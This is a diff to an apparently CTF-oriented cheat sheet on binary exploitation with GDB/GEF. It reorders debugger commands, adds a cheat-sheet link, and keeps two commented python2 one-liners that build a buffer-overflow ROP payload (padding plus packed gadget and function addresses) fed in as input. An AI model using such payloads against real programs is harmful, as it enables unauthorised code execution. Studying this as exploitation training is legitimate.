@@ -26,16 +26,22 @@ offset_padding + pop_rdi_gadget + print_flag_cmd + system_addr
 Gdb/Gef
 =======
 {% highlight bash%}
-pattern create 200          :Create cyclic patterm
-pattern offset              :Get the offset based on the value off RSP/ESP
+b main                      :Break at main 
+r                           :Run
 info functions              :List functions
 disassemble fonctions       :Show function
-break * 0x00                :Break at 0x00
+
+i r                         :Print register (not really necessary with gef)
+x/20x $sp                   :Dump the stack starting at $sp
+x/4i $pc                    :Dump 4 instruction starting at $pc
+b * 0x00                    :Break at 0x00
+
+pattern create 200          :Create cyclic patterm
+pattern offset              :Get the offset based on the value off RSP/ESP
+r < input                   :Injecting payload to input
 
 #python2 -c 'import struct;print "A"*40 + struct.pack("Q",0x400883)+struct.pack("Q",0x601060)+struct.pack("Q",0x4005e0)' > input
 #python2 -c 'from pwn import *;print("A" * 40 + p64(0x0400883) + p64(0x00601060) + p64(0x00400810))' > input
-
-r < input                   :Injecting payload to input
 {% endhighlight %}
 [Back to the top](#header)
 
@@ -129,8 +135,10 @@ Gdb/Gef
 
 -[gef.readthedocs.io][link1]
 -[github.com/hugsy/][link2]
+-[Cheat Sheet][link3]
 
 [Back to the top](#header)
 
 [link1]:https://gef.readthedocs.io/en/master/commands/pattern/ 
 [link2]:https://github.com/hugsy/gef
+[link3]:https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf
